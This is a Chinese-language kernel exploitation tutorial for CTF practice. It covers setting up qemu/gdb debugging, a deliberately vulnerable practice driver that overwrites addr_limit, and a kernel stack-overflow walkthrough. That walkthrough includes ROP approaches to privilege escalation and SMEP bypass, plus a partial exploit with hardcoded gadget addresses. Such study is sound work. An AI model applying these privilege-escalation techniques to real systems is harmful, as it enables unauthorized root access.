+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>对于 <code>ctf</code> 中的 <code>pwn</code> 一般都是给一个 <code>linux</code> 内核文件 和一个 <code>busybox</code> 文件系统，然后用 <code>qemu</code> 启动起来。而且我觉得用 <code>qemu</code> 调试时 <code>gdb</code> 的反应比较快，也没有一些奇奇怪怪的问题。所以推荐用 <code>qemu</code> 来调，如果是真实漏洞那 <code>vmware</code> 双机调试肯定是逃不掉的 (:_。</p>
+<h2 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h2><p>首先去 <code>linux</code> 内核的官网下载 内核源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://mirrors.edge.kernel.org/pub/linux/kernel/</div></pre></td></tr></table></figure>
+<blockquote>
+<p>我用的 <code>ubuntu 16.04</code> 来编译内核，默认的 <code>gcc</code> 比较新，所以编译了 <code>4.4.x</code> 版本，免得换 <code>gcc</code></p>
+</blockquote>
+<p>安装好一些编译需要的库 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install libncurses5-dev build-essential kernel-package</div></pre></td></tr></table></figure>
+<p>进入内核源代码目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">make menuconfig</div></pre></td></tr></table></figure>
+<p>配置一下编译参数，注意就是修改下面列出的一些选项 （没有的选项就不用管了</p>
+<blockquote>
+<p>由于我们需要使用kgdb调试内核，注意下面这几项一定要配置好：<br>KernelHacking –&gt;</p>
+<ul>
+<li>选中Compile the kernel with debug info</li>
+<li>选中Compile the kernel with frame pointers</li>
+<li>选中KGDB:kernel debugging with remote gdb，其下的全部都选中。</li>
+</ul>
+<p>Processor type and features–&gt;</p>
+<ul>
+<li>去掉Paravirtualized guest support</li>
+</ul>
+<p>KernelHacking–&gt;</p>
+<ul>
+<li>去掉Write protect kernel read-only data structures（否则不能用软件断点）</li>
+</ul>
+</blockquote>
+<p><strong>参考</strong></p>
+<p><a href="https://xz.aliyun.com/t/2024" target="_blank" rel="external">Linux内核调试</a></p>
+<h2 id="编译-busybox-amp-amp-构建文件系统"><a href="#编译-busybox-amp-amp-构建文件系统" class="headerlink" title="编译 busybox &amp;&amp; 构建文件系统"></a>编译 busybox &amp;&amp; 构建文件系统</h2><h3 id="编译-busybox"><a href="#编译-busybox" class="headerlink" title="编译 busybox"></a>编译 busybox</h3><p>启动内核还需要一个简单的文件系统和一些命令，可以使用 <code>busybox</code> 来构建</p>
+<p>首先下载，编译 <code>busybox</code> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">cd ..</div><div class="line">wget https://busybox.net/downloads/busybox-1.19.4.tar.bz2 # 建议改成最新的 busybox </div><div class="line">tar -jxvf busybox-1.19.4.tar.bz2</div><div class="line">cd busybox-1.19.4</div><div class="line">make menuconfig  </div><div class="line">make install</div></pre></td></tr></table></figure>
+<h3 id="编译的一些配置"><a href="#编译的一些配置" class="headerlink" title="编译的一些配置"></a>编译的一些配置</h3><blockquote>
+<p>make menuconfig 设置</p>
+<p>Busybox Settings -&gt; Build Options -&gt; Build Busybox as a static binary 编译成 静态文件</p>
+<p>关闭下面两个选项</p>
+<p>Linux System Utilities -&gt; [] Support mounting NFS file system 网络文件系统<br>Networking Utilities -&gt; [] inetd (Internet超级服务器)</p>
+</blockquote>
+<p>构建文件系统</p>
+<p>编译完,、<code>make install</code> 后， 在 <code>busybox</code> 源代码的根目录下会有一个 <code>_install</code> 目录下会存放好编译后的文件。</p>
+<p>然后配置一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">cd _install</div><div class="line">mkdir proc sys dev etc etc/init.d</div><div class="line">vim etc/init.d/rcS</div><div class="line">chmod +x etc/init.d/rcS</div></pre></td></tr></table></figure>
+<p>就是创建一些目录，然后创建 <code>etc/init.d/rcS</code> 作为 <code>linux</code> 启动脚本, 内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#!/bin/sh</div><div class="line">mount -t proc none /proc</div><div class="line">mount -t sysfs none /sys</div><div class="line">/sbin/mdev -s</div></pre></td></tr></table></figure>
+<p>记得加上 <code>x</code> 权限，允许脚本的执行。</p>
+<p>配置完后的目录结构</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180423214247-354240c0-46fc-1.png" alt="image.png"></p>
+<p>然后调用 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</div></pre></td></tr></table></figure>
+<p>创建文件系统</p>
+<p>接着就可以使用 <code>qemu</code> 来运行内核了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">qemu-system-x86_64 -kernel ~/linux-4.1.1/arch/x86_64/boot/bzImage -initrd ~/linux-4.1.1/rootfs.img -append &quot;console=ttyS0 root=/dev/ram rdinit=/sbin/init&quot; -cpu kvm64,+smep,+smap --nographic -gdb tcp::1234</div></pre></td></tr></table></figure>
+<p>对一些选项解释一下</p>
+<blockquote>
+<p><code>-cpu kvm64,+smep,+smap</code>  设置 <code>CPU</code>的安全选项， 这里开启了  <code>smap</code>  和  <code>smep</code></p>
+<p><code>-kernel</code> 设置内核 <code>bzImage</code> 文件的路径</p>
+<p><code>-initrd</code> 设置刚刚利用 <code>busybox</code> 创建的 <code>rootfs.img</code> ，作为内核启动的文件系统</p>
+<p><code>-gdb tcp::1234</code>  设置 <code>gdb</code> 的调试端口 为 <code>1234</code></p>
+</blockquote>
+<p><strong>参考</strong></p>
+<p><a href="http://t.cn/RmJi86c" target="_blank" rel="external">Linux内核漏洞利用（一）环境配置</a></p>
+<h1 id="内核模块创建与调试"><a href="#内核模块创建与调试" class="headerlink" title="内核模块创建与调试"></a>内核模块创建与调试</h1><h2 id="创建内核模块"><a href="#创建内核模块" class="headerlink" title="创建内核模块"></a>创建内核模块</h2><p>在学习阶段还是自己写点简单 内核模块 (驱动)  来练习比较好。这里以一个简单的用于测试 <strong>通过修改 thread_info-&gt;addr_limit 来提权</strong> 的模块为例</p>
+<p>首先是源代码程序 <code>arbitrarily_write.c</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div></pre></td><td class="code"><pre><div class="line">#include &lt;linux/module.h&gt;</div><div class="line">#include &lt;linux/types.h&gt;</div><div class="line">#include &lt;linux/kernel.h&gt;</div><div class="line">#include &lt;linux/fs.h&gt;</div><div class="line">#include &lt;linux/errno.h&gt;</div><div class="line">#include &lt;linux/cdev.h&gt;</div><div class="line">#include &lt;asm/uaccess.h&gt;</div><div class="line">#include &lt;linux/device.h&gt;</div><div class="line">#include&lt;linux/slab.h&gt;</div><div class="line">#include&lt;linux/string.h&gt;</div><div class="line"></div><div class="line">struct class *arw_class;</div><div class="line">struct cdev cdev;</div><div class="line">char *p;</div><div class="line">int arw_major=248;</div><div class="line"></div><div class="line">struct param</div><div class="line">&#123;</div><div class="line">    size_t len;</div><div class="line">    char* buf;</div><div class="line">    char* addr;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">char buf[16] = &#123;0&#125;;</div><div class="line"></div><div class="line">long arw_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)</div><div class="line">&#123;</div><div class="line"></div><div class="line">    struct param par;</div><div class="line">    struct param* p_arg;</div><div class="line">    long p_stack;</div><div class="line">    long* ptr;</div><div class="line">    struct thread_info * info;</div><div class="line">    copy_from_user(&amp;par, arg, sizeof(struct param));</div><div class="line">    </div><div class="line">    int retval = 0;</div><div class="line">    switch (cmd) &#123;</div><div class="line">        case 8:</div><div class="line">            printk(&quot;current: %p, size: %d, buf:%p\n&quot;, current, par.len, par.buf);</div><div class="line">            copy_from_user(buf, par.buf, par.len);</div><div class="line">            break;</div><div class="line">        case 7:</div><div class="line">            printk(&quot;buf(%p), content: %s\n&quot;, buf, buf);</div><div class="line">            break;</div><div class="line">        case 5:</div><div class="line">            p_arg = (struct param*)arg;</div><div class="line">            p_stack = (long)&amp;retval;</div><div class="line">            p_stack = p_stack&amp;0xFFFFFFFFFFFFC000;</div><div class="line">            info = (struct thread_info * )p_stack;</div><div class="line">            </div><div class="line">            printk(&quot;addr_limit&apos;s addr: 0x%p\n&quot;, &amp;info-&gt;addr_limit);</div><div class="line">            memset(&amp;info-&gt;addr_limit, 0xff, 0x8);</div><div class="line">            // 返回 thread_info 的地址， 模拟信息泄露</div><div class="line">            put_user(info, &amp;p_arg-&gt;addr);</div><div class="line">            break;</div><div class="line"></div><div class="line">        case 999:</div><div class="line">            p = kmalloc(8, GFP_KERNEL);</div><div class="line">            printk(&quot;kmalloc(8) : %p\n&quot;, p);</div><div class="line">            break;</div><div class="line">        case 888://数据清零</div><div class="line">            kfree(p);</div><div class="line">            printk(&quot;kfree : %p\n&quot;, p);</div><div class="line">            break;</div><div class="line">        default:</div><div class="line">            retval = -1;</div><div class="line">            break;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    return retval;</div><div class="line">&#125;</div><div class="line"></div><div class="line">static const struct file_operations arw_fops = &#123;</div><div class="line">    .owner = THIS_MODULE,</div><div class="line">    .unlocked_ioctl = arw_ioctl,//linux 2.6.36内核之后unlocked_ioctl取代ioctl</div><div class="line">&#125;;</div><div class="line"></div><div class="line">static int arw_init(void)</div><div class="line">&#123;</div><div class="line">    //设备号</div><div class="line">    dev_t devno = MKDEV(arw_major, 0);</div><div class="line">    int result;</div><div class="line"></div><div class="line">    if (arw_major)//静态分配设备号</div><div class="line">        result = register_chrdev_region(devno, 1, &quot;arw&quot;);</div><div class="line">    else &#123;//动态分配设备号</div><div class="line">        result = alloc_chrdev_region(&amp;devno, 0, 1, &quot;arw&quot;);</div><div class="line">        arw_major = MAJOR(devno);</div><div class="line">    &#125;</div><div class="line">    // 打印设备号</div><div class="line">    printk(&quot;arw_major /dev/arw: %d&quot;, arw_major);</div><div class="line"></div><div class="line">    if (result &lt; 0)</div><div class="line">        return result;</div><div class="line"></div><div class="line">    arw_class = class_create(THIS_MODULE, &quot;arw&quot;);</div><div class="line">    device_create(arw_class, NULL, devno, NULL, &quot;arw&quot;);</div><div class="line"></div><div class="line">    cdev_init(&amp;cdev, &amp;arw_fops);</div><div class="line">    cdev.owner = THIS_MODULE;</div><div class="line">    cdev_add(&amp;cdev, devno, 1);</div><div class="line">    printk(&quot;arw init success\n&quot;);</div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">static void arw_exit(void)</div><div class="line">&#123;</div><div class="line">    cdev_del(&amp;cdev);</div><div class="line">    device_destroy(arw_class, MKDEV(arw_major, 0));</div><div class="line">    class_destroy(arw_class);</div><div class="line">    unregister_chrdev_region(MKDEV(arw_major, 0), 1);</div><div class="line">    printk(&quot;arw exit success\n&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">MODULE_AUTHOR(&quot;exp_ttt&quot;);</div><div class="line">MODULE_LICENSE(&quot;GPL&quot;);</div><div class="line"></div><div class="line">module_init(arw_init);</div><div class="line">module_exit(arw_exit);</div></pre></td></tr></table></figure>
+<p>注册了一个 字符设备， 设备文件路径为 <code>/dev/arw</code>, 实现了 <code>arw_ioctl</code> 函数，用户态可以通过 <code>ioctl</code> 和这个函数进行交互。</p>
+<p>在 <code>qemu</code> 中创建设备文件，貌似不会帮我们自动创建设备文件，需要手动调用 <code>mknod</code> 创建设备文件，此时需要设备号，于是在注册驱动时把拿到的 <strong>主设备号 打印了出来， 次设备号 从 0 开始试</strong> 。创建好设备文件后要<strong>设置好权限</strong>，使得普通用户可以访问。</p>
+<p>然后是测试代码（用户态调用）<code>test.c</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;fcntl.h&gt;</div><div class="line">#include &lt;sys/ioctl.h&gt;</div><div class="line">struct param</div><div class="line">&#123;</div><div class="line">    size_t len;</div><div class="line">    char* buf;</div><div class="line">    char* addr;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"></div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">    int fd;</div><div class="line">    char buf[16];</div><div class="line"></div><div class="line">    fd = open(&quot;/dev/arw&quot;, O_RDWR);</div><div class="line">    if (fd == -1) &#123;</div><div class="line">        printf(&quot;open hello device failed!\n&quot;);</div><div class="line">        return -1;</div><div class="line">    &#125;</div><div class="line">    struct param p;</div><div class="line">    p.len = 8;</div><div class="line">    p.buf = malloc(32);</div><div class="line">    strcpy(p.buf, &quot;hello&quot;);</div><div class="line">    ioctl(fd, 8, &amp;p);</div><div class="line">    ioctl(fd, 7, &amp;p);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>打开设备文件，然后使用 <code>ioctl</code> 和刚刚驱动进行交互。</p>
+<p>接下来是<code>Makefile</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">obj-m := arbitrarily_write.o</div><div class="line">KERNELDIR := /home/haclh/linux-4.1.1</div><div class="line">PWD := $(shell pwd) </div><div class="line">OUTPUT := $(obj-m) $(obj-m:.o=.ko) $(obj-m:.o=.mod.o) $(obj-m:.o=.mod.c) modules.order Module.symvers</div><div class="line"> </div><div class="line">modules:</div><div class="line">	$(MAKE) -C $(KERNELDIR) M=$(PWD) modules</div><div class="line">	gcc -static test.c -o test</div><div class="line"> </div><div class="line">clean:</div><div class="line">	rm -rf $(OUTPUT)</div><div class="line">	rm -rf test</div></pre></td></tr></table></figure>
+<blockquote>
+<p> <code>test.c</code> 要静态编译， <code>busybox</code> 编译的文件系统，没有 <code>libc</code>.</p>
+<p>把 <code>KERNELDIR</code> 改成 内核源代码的根目录。</p>
+</blockquote>
+<p>同时还创建了一个脚本用于在 <code>qemu</code> 加载的系统中，加载模块，创建设备文件，新增测试用的普通用户。</p>
+<p><code>mknod.sh</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">mkdir /home</div><div class="line">mkdir /home/hac425</div><div class="line">touch /etc/passwd</div><div class="line">touch /etc/group</div><div class="line">adduser hac425</div><div class="line">insmod arbitrarily_write.ko</div><div class="line">mknod /dev/arw c 248 0</div><div class="line">chmod 777 /dev/arw </div><div class="line">cat /proc/modules</div></pre></td></tr></table></figure>
+<blockquote>
+<p><code>mknod</code> 命令的参数根据实际情况进行修改</p>
+</blockquote>
+<p>为了方便对代码进行修改，写了个 <code>shell</code> 脚本，一件完成模块和测试代码的编译、 <code>rootfs.img</code> 的重打包 和 <code>qemu</code> 运行。</p>
+<p><code>start.sh</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">PWD=$(pwd)</div><div class="line">make clean</div><div class="line">sleep 0.5</div><div class="line">make</div><div class="line">sleep 0.5</div><div class="line">rm ~/busybox-1.27.1/_install/&#123;*.ko,test&#125;</div><div class="line">cp mknod.sh test *.ko ~/busybox-1.27.1/_install/</div><div class="line">cd ~/busybox-1.27.1/_install/</div><div class="line">rm ~/linux-4.1.1/rootfs.img</div><div class="line">find . | cpio -o --format=newc &gt; ~/linux-4.1.1/rootfs.img</div><div class="line">cd $PWD</div><div class="line">qemu-system-x86_64 -kernel ~/linux-4.1.1/arch/x86_64/boot/bzImage -initrd ~/linux-4.1.1/rootfs.img -append &quot;console=ttyS0 root=/dev/ram rdinit=/sbin/init&quot; -cpu kvm64,+smep --nographic -gdb tcp::1234</div></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180423214247-354f82d0-46fc-1.png" alt="image.png"></p>
+<p>然后 <code>./start.sh</code>，就可以运行起来了。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180423214247-355eeea0-46fc-1.png" alt="image.png"></p>
+<p>进入系统后，首先使用 <code>mknod.sh</code> 安装模块，创建好设备文件等操作，然后切换到一个普通用户，执行 <code>test</code> 测试驱动是否正常。对比源代码，可以判断驱动是正常运行的</p>
+<h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>用 <code>qemu</code> 运行内核时，加了一个 <code>-gdb tcp::1234</code> 的参数， <code>qemu</code> 会在 <code>1234</code> 端口起一个 <code>gdb_server</code> ，我们直接用 <code>gdb</code> 连上去即可。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180423214247-356fddaa-46fc-1.png" alt="image.png"></p>
+<blockquote>
+<p>记得加载 <code>vmlinux</code> 文件，以便在调试的时候可以有调试符号。</p>
+</blockquote>
+<p>为了调试内核模块，还需要加载  驱动的 符号文件，首先在系统里面获取驱动的加载基地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/ # cat /proc/modules | grep arb</div><div class="line">arbitrarily_write 2168 0 - Live 0xffffffffa0000000 (O)</div><div class="line">/ #</div></pre></td></tr></table></figure>
+<p>然后在 <code>gdb</code> 里面加载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">gef➤  add-symbol-file ~/kernel/arbitrarily_write/arbitrarily_write.ko 0xffffffffa0000000</div><div class="line">add symbol table from file &quot;/home/haclh/kernel/arbitrarily_write/arbitrarily_write.ko&quot; at</div><div class="line">	.text_addr = 0xffffffffa0000000</div><div class="line">Reading symbols from /home/haclh/kernel/arbitrarily_write/arbitrarily_write.ko...done.</div><div class="line">gef➤</div></pre></td></tr></table></figure>
+<p>此时就可以直接对驱动的函数下断点了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">b arw_ioctl</div></pre></td></tr></table></figure>
+<p>然后运行测试程序 ( <code>test</code> )，就可以断下来了。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180423214247-357f722e-46fc-1.png" alt="image.png"></p>
+<h1 id="利用方式汇总"><a href="#利用方式汇总" class="headerlink" title="利用方式汇总"></a>利用方式汇总</h1><h2 id="内核-Rop"><a href="#内核-Rop" class="headerlink" title="内核 Rop"></a>内核 Rop</h2><h3 id="Rop-By-栈溢出"><a href="#Rop-By-栈溢出" class="headerlink" title="Rop-By-栈溢出"></a>Rop-By-栈溢出</h3><p>本节的相关文件位于 <code>kmod</code></p>
+<h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><p>开始打算直接用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/black-bunny/LinKern-x86_64-bypass-SMEP-KASLR-kptr_restric</div></pre></td></tr></table></figure>
+<p>里面给的内核镜像，发现有些问题。于是自己编译了一个 <code>linux 4.4.72</code> 的镜像，然后自己那他的源码编译了驱动。</p>
+<p>默认编译驱动开了栈保护，懒得重新编译内核了，于是直接 在 驱动里面 patch 掉了 栈保护的检测代码。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180423214247-359284f4-46fc-1.png" alt="image.png"></p>
+<h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><p>漏洞位于 <code>vuln_write</code> 函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">static ssize_t vuln_write(struct file *f, const char __user *buf,size_t len, loff_t *off)</div><div class="line">&#123;</div><div class="line">  char buffer[100]=&#123;0&#125;;</div><div class="line"></div><div class="line">  if (_copy_from_user(buffer, buf, len))</div><div class="line">    return -EFAULT;</div><div class="line">  buffer[len-1]=&apos;\0&apos;;</div><div class="line"></div><div class="line">  printk(&quot;[i] Module vuln write: %s\n&quot;, buffer);</div><div class="line"></div><div class="line">  strncpy(buffer_var,buffer,len);</div><div class="line"></div><div class="line">  return len;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>可以看到 <code>_copy_from_user</code> 的参数都是我们控制的，然后把内容读入了栈中的 <code>buffer</code>， 简单的栈溢出。</p>
+<p>把驱动拖到 <code>ida</code> 里面，发现没有开启 <code>cancary</code> , 同时 <code>buffer</code> 距离 返回地址的 偏移为 <code>0x7c</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180423214248-35a68896-46fc-1.png" alt="image.png"></p>
+<p>所以只要读入超过 <code>0x7c</code> 个字节的数据就可以覆盖到 返回地址，控制 <code>rip</code></p>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>如果没有开启任何保护的话，直接把返回地址改成用户态的 函数，然后调用 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">commit_creds(prepare_kernel_cred(0))</div></pre></td></tr></table></figure>
+<p>就可以完成提权了。</p>
+<blockquote>
+<p>可以参考：   <a href="http://t.cn/RmXCzxS" target="_blank" rel="external">Linux内核漏洞利用（三）Kernel Stack Buffer Overflow</a></p>
+</blockquote>
+<p>秉着学习的态度，这里我开了 <code>smep</code> 。 这个安全选项的作用是禁止内核去执行<strong>用户空间的代码</strong>。 </p>
+<p>但是我们依旧可以执行内核的代码 ，于是在内核 进行 <strong>ROP</strong>。 </p>
+<p><code>ROP</code>的话有两种思路</p>
+<ol>
+<li>利用 <code>ROP</code> ，执行 <code>commit_creds(prepare_kernel_cred(0))</code> , 然后 <code>iret</code> 返回用户空间。</li>
+<li>利用 <code>ROP</code> 关闭 <code>smep</code> , 然后进行 <code>ret2user</code> 攻击。</li>
+</ol>
+<h5 id="利用-rop-直接提权"><a href="#利用-rop-直接提权" class="headerlink" title="利用 rop 直接提权"></a>利用 rop 直接提权</h5><p>此时布置的 <code>rop</code> 链 类似下面</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180423214248-35b77610-46fc-1.png" alt="image.png"></p>
+<p>就是 调用  <code>commit_creds(prepare_kernel_cred(0))</code> , 然后 <code>iret</code> 返回到用户空间。</p>
+<p><strong>参考</strong></p>
+<p><a href="https://xz.aliyun.com/t/2054#toc-9" target="_blank" rel="external">入门学习linux内核提权</a> </p>
+<h5 id="利用-rop-关闭-smep-amp-amp-ret2user"><a href="#利用-rop-关闭-smep-amp-amp-ret2user" class="headerlink" title="利用 rop 关闭 smep &amp;&amp; ret2user"></a>利用 rop 关闭 smep &amp;&amp; ret2user</h5><p>系统根据 cr4 寄存器的值判断是否开启 smep， 然而 cr4 寄存器可以使用 mov 指令进行修改，于是事情就变得简单了，利用 <code>rop</code> 设置 <code>cr4</code> 为 <code>0x6f0</code> （这个值可以通过用 <code>cr4原始值 &amp; 0xFFFFF</code> 得到）， 然后 <code>iret</code> 到用户空间去执行提权代码。</p>
+<blockquote>
+<p>在 <code>gdb</code> 中貌似看不到 <code>cr4</code> 寄存器，可以从 内核的崩溃信息里面获取 开启 <code>smep</code> 下的 <code>cr4</code> 寄存器值</p>
+</blockquote>
+<p><code>exp</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;fcntl.h&gt;</div><div class="line">#include &lt;sys/mman.h&gt;</div><div class="line">#include &lt;sys/ioctl.h&gt;</div><div class="line"> </div><div class="line">typedef int __attribute__((regparm(3)))(*_commit_creds)(unsigned long cred);</div><div class="line">typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);</div><div class="line"></div><div class="line">// 两个函数的地址</div><div class="line">_commit_creds commit_creds = (_commit_creds) 0xffffffff810a1420;</div><div class="line">_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred) 0xffffffff810a1810;</div><div class="line"></div><div class="line">unsigned long xchg_eax_esp = 0xFFFFFFFF81007808;</div><div class="line">unsigned long rdi_to_cr4 = 0xFFFFFFFF810635B4; // mov cr4, rdi ;pop rbp ; ret</div><div class="line">unsigned long pop_rdi_ret = 0xFFFFFFFF813E7D6F;</div><div class="line">unsigned long iretq = 